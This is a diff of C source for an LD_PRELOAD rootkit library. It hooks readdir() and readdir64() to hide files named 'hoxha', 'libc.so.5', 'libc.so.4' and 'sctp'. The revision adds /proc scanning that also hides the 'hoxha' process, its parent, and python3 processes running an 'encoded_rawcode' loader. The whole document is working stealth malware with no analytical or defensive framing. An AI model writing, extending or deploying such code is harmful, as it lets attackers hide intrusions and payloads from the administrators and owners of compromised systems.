@@ -1,131 +1,137 @@
 #define _GNU_SOURCE
 #include <dirent.h>
-#include <string.h>
 #include <dlfcn.h>
-#include <stdlib.h>
 #include <errno.h>
-#include <stdint.h>
+#include <stdlib.h>
+#include <string.h>
 #include <stdio.h>
 #include <unistd.h>
 #include <sys/types.h>
 #include <ctype.h>
 
-#define MAX_HIDDEN 16
+#define MAX_HIDDEN 32  // Increased to allow dynamic PID entries too
 
-// These are the static filenames/directories we always want to hide.
+// static names to always hide
 static const char *STATIC_HIDE_NAMES[] = {
-    "rc.local",
     "hoxha",
     "libc.so.5",
+    "libc.so.4",
+    "sctp",
     NULL
 };
 
-// We allocate space for up to MAX_HIDDEN names + a NULL sentinel.
 static char *hide_names[MAX_HIDDEN + 1] = { 0 };
 
-// Constructor to hide PID at load time.
-// Return 1 if str consists entirely of digits
-static int is_all_digits(const char *str) {
-    for (; *str; ++str) {
-        if (!isdigit((unsigned char)*str)) return 0;
-    }
-    return 1;
-}
-
-// Return 1 if "/proc/<pid>/comm" exactly equals "hoxha"
-static int comm_matches(const char *pid) {
-    char path[256];
-    snprintf(path, sizeof(path), "/proc/%s/comm", pid);
-
-    FILE *f = fopen(path, "r");
-    if (!f) return 0;
-
-    char comm[256];
-    if (!fgets(comm, sizeof(comm), f)) {
-        fclose(f);
-        return 0;
-    }
-    fclose(f);
-
-    // Strip trailing newline
-    size_t len = strlen(comm);
-    if (len > 0 && comm[len - 1] == '\n') {
-        comm[len - 1] = '\0';
-    }
-    return (strcmp(comm, "hoxha") == 0);
-}
-
-// Scan /proc for a PID whose comm is "hoxha"
-// Return that PID as an integer, or 0 if not found
-static int find_hoxha_pid(void) {
-    DIR *proc = opendir("/proc");
-    if (!proc) return 0;
-
-    struct dirent *entry;
-    while ((entry = readdir(proc)) != NULL) {
-        if (entry->d_type != DT_DIR) continue;
-        if (!is_all_digits(entry->d_name)) continue;
-
-        if (comm_matches(entry->d_name)) {
-            int pid = atoi(entry->d_name);
-            closedir(proc);
-            return pid;
+// Helpers to add names or PIDs to hide
+static void add_hide_name(const char *name) {
+    for (int i = 0; i < MAX_HIDDEN; ++i) {
+        if (!hide_names[i]) {
+            hide_names[i] = strdup(name);
+            return;
         }
     }
-    closedir(proc);
-    return 0;
 }
 
-// Constructor to build hide_names[] with the pid number.
+static void add_hide_pid(pid_t pid) {
+    char buf[16];
+    snprintf(buf, sizeof(buf), "%d", pid);
+    add_hide_name(buf);
+}
+
+// Initialization to populate hide_names[]
 __attribute__((constructor))
 static void init_hide_names(void) {
-    int idx = 0;
-
-    // 2.A) Copy all static hide names via strdup()
-    for (int i = 0; STATIC_HIDE_NAMES[i] != NULL && idx < MAX_HIDDEN; ++i) {
-        hide_names[idx++] = strdup(STATIC_HIDE_NAMES[i]);
+    // Add static entries
+    for (int i = 0; STATIC_HIDE_NAMES[i]; ++i) {
+        add_hide_name(STATIC_HIDE_NAMES[i]);
     }
 
-    // 2.B) Find the PID of a running "hoxha" (if any) and append it
-    int pid = find_hoxha_pid();
-    if (pid > 0 && idx < MAX_HIDDEN) {
-        // Convert PID to string
-        char buf[16];
-        snprintf(buf, sizeof(buf), "%d", pid);
-        hide_names[idx++] = strdup(buf);
+    // Scan /proc for dynamic hiding
+    DIR *d = opendir("/proc");
+    if (!d) return;
+
+    struct dirent *e;
+    while ((e = readdir(d))) {
+        if (e->d_type != DT_DIR || !isdigit(e->d_name[0])) continue;
+
+        pid_t pid = atoi(e->d_name);
+
+        // Check /proc/[pid]/comm
+        char comm_path[64];
+        snprintf(comm_path, sizeof(comm_path), "/proc/%d/comm", pid);
+        FILE *f = fopen(comm_path, "r");
+        if (!f) continue;
+
+        char name[256];
+        if (fgets(name, sizeof(name), f)) {
+            name[strcspn(name, "\n")] = 0;
+
+            if (strcmp(name, "hoxha") == 0) {
+                add_hide_pid(pid);
+
+                // Check PPID
+                char status_path[64];
+                snprintf(status_path, sizeof(status_path), "/proc/%d/status", pid);
+                FILE *sf = fopen(status_path, "r");
+                if (sf) {
+                    char line[256];
+                    while (fgets(line, sizeof(line), sf)) {
+                        if (strncmp(line, "PPid:", 5) == 0) {
+                            pid_t ppid = atoi(line + 5);
+                            if (ppid > 1) {
+                                add_hide_pid(ppid);
+                            }
+                            break;
+                        }
+                    }
+                    fclose(sf);
+                }
+            }
+        }
+        fclose(f);
+
+        // Check /proc/[pid]/cmdline for python3 -c with encoded loader
+        char cmdline_path[64];
+        snprintf(cmdline_path, sizeof(cmdline_path), "/proc/%d/cmdline", pid);
+        FILE *cf = fopen(cmdline_path, "r");
+        if (cf) {
+            char cmdline[4096];
+            size_t len = fread(cmdline, 1, sizeof(cmdline) - 1, cf);
+            fclose(cf);
+
+            cmdline[len] = '\0';
+            if (strstr(cmdline, "python3") && strstr(cmdline, "encoded_rawcode")) {
+                add_hide_pid(pid);
+            }
+        }
     }
 
-    // 2.C) Null‐terminate the list
-    hide_names[idx] = NULL;
+    closedir(d);
 }
 
-// Destructor to free strdup()ed strings
+// Cleanup
 __attribute__((destructor))
 static void cleanup_hide_names(void) {
-    for (int i = 0; i < MAX_HIDDEN && hide_names[i] != NULL; ++i) {
+    for (int i = 0; i < MAX_HIDDEN && hide_names[i]; ++i) {
         free(hide_names[i]);
         hide_names[i] = NULL;
     }
 }
 
-// Helper to check if a directory entry name should be hidden
+// Check if name matches hidden entry
 static int libhide(const char *name) {
-    for (int i = 0; hide_names[i] != NULL; ++i) {
-        if (strcmp(name, hide_names[i]) == 0) {
-            return 1;
-        }
+    for (int i = 0; i < MAX_HIDDEN && hide_names[i]; ++i) {
+        if (strcmp(name, hide_names[i]) == 0) return 1;
     }
     return 0;
 }
 
-// Hook readdir() and readdir64()
-static struct dirent *(*orig_readdir)(DIR *)       = NULL;
-static struct dirent64 *(*orig_readdir64)(DIR *)   = NULL;
+// Hooked readdir() and readdir64()
+static struct dirent *(*orig_readdir)(DIR *) = NULL;
+static struct dirent64 *(*orig_readdir64)(DIR *) = NULL;
 
-// Tunneled readdir() that skips any entry matching hide_names[]
 struct dirent *readdir(DIR *dirp) {
     if (!orig_readdir) {
-        // Use union to avoid ISO C forbid direct cast
         union { void *p; struct dirent *(*f)(DIR *); } u;
         u.p = dlsym(RTLD_NEXT, "readdir");
         orig_readdir = u.f;
@@ -137,15 +143,12 @@ struct dirent *readdir(DIR *dirp) {
 
     struct dirent *entry;
     while ((entry = orig_readdir(dirp)) != NULL) {
-        if (libhide(entry->d_name)) {
-            continue;
-        }
+        if (libhide(entry->d_name)) continue;
         return entry;
     }
     return NULL;
 }
 
-// Tunneled readdir64() that skips any entry matching hide_names[]
 struct dirent64 *readdir64(DIR *dirp) {
     if (!orig_readdir64) {
         union { void *p; struct dirent64 *(*f)(DIR *); } u;
@@ -159,9 +162,7 @@ struct dirent64 *readdir64(DIR *dirp) {
 
     struct dirent64 *entry;
     while ((entry = orig_readdir64(dirp)) != NULL) {
-        if (libhide(entry->d_name)) {
-            continue;
-        }
+        if (libhide(entry->d_name)) continue;
         return entry;
     }
     return NULL;
